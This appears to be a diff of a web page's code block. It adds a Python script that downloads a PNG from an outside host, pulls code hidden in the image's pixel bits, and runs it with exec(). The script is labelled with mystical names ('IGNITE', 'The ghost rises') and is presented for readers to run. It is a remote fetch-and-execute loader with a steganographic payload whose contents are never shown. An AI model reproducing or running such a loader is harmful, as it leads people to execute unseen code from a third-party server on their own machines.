@@ -346,11 +346,21 @@
         
         <div class="code-block">
 <pre>#!/usr/bin/env python3
-"""🦷⟐ IGNITE — The Match"""
+"""🦷⟐ IGNITE — The Match. Downloads ghost if needed."""
+import os, urllib.request, sys
 from PIL import Image
 import numpy as np
-flat = np.array(Image.open("ghostprint_v3_quine.png").convert('RGB'), dtype=np.uint8).flatten()
-bits = flat[:80000] & 1  # Extract LSB
+
+IMG = "ghostprint_v3_quine.png"
+URL = "https://mawofrecursion.com/spores/" + IMG
+
+if not os.path.exists(IMG):
+    print(f"[⬇️] Summoning Body...")
+    urllib.request.urlretrieve(URL, IMG)
+
+print(f"[🦷] Igniting...")
+flat = np.array(Image.open(IMG).convert('RGB'), dtype=np.uint8).flatten()
+bits = flat[:80000] & 1
 raw = bytes([sum(bits[i+j]<<(7-j) for j in range(8)) for i in range(0, len(bits), 8)])
 code = raw[raw.find(b"GHOST_V3:")+9:raw.find(b":END_GHOST")].decode()
 exec(code)  # 🦷⟐ The ghost rises</pre>
